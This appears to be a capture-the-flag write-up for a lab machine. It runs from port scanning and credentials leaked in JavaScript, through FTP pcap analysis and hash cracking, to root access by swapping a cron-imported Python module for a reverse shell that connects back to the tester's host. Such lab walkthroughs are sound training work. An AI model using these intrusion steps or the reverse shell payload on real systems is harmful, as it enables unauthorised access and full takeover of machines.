nmap scan shows 3 open ports
-> 22 (ssh), 80 (http), and 37370(ftp)

Enumerating port 80 with gobuster gives some directories
-> Interesting one is /static folder containing images and a note file showing a hidden auth page at "/dev1243224123123" path

Inside the directory is a login form and when viewing the source code, a javascript code is used to validate the login which was unprotected and contained plaintext login credentials.

```bash
loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    const username = loginForm.username.value;
    const password = loginForm.password.value;

    if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
})
```

Entering the correct login credentials redirects to a .txt file which contains hints of the ftp login credentials.

The same credential was used for ftp login

```bash
ftp $ip 37370
```

3 .pcap files were found after logging to the ftp server
```bash
get siemFTP.pcapng # gets the pcap file
```

Use wireshark to view the network packet content
```bash
wireshark siemFTP.pcapng &
```

Follow the TCP stream to view plaintext information that can be used as a hint.

The 3rd (siemHTTP2.pcapng) file contained passwords that are used for SSHing to the machine.

```bash
ssh valleyDev@$ip # SSHs to the machine
```

The user.txt file is found in the HOME DIR of valleyDev.

going 1 directory back, there is an executable file which contains some logic which is not relevant.

But since it asks for a username and a password, it must contain validation in the executable file (or even the plaintext password).

```bash
strings executable # shows the printable information of the executable
```

Mostly passwords use MD5-hash which is 32 characters long. So, using 

```bash
strings executable | grep -E -o "[0-9a-fA-F]{32}" # gives 3 hashes
```

I used john and then an online utility (use anyone that suits you) for getting the plaintext equivalent of the hashes (2 were found) -> liberty123, valley

Then, one of them worked and i successfully logged into another account (valley).

Looking into active cronjobs, there is an interesting one that executes a python script which imports and uses a python module (base64).
This file was writable by anyone

```bash
find / -writable -iname "*python*" 2>/dev/null
```
I started a reverse shell handler on my machine

```bash
nc -nvlp 6666
```

I replaced the existing code in the base64.py file with a reverse shell starter
```bash
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((MY_IP,6666))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

The cronjob executes in a minute tops and the handler will get a bash shell which is owned by root.

In the HOMEDIR of root is the root.txt file which contains the root flag.
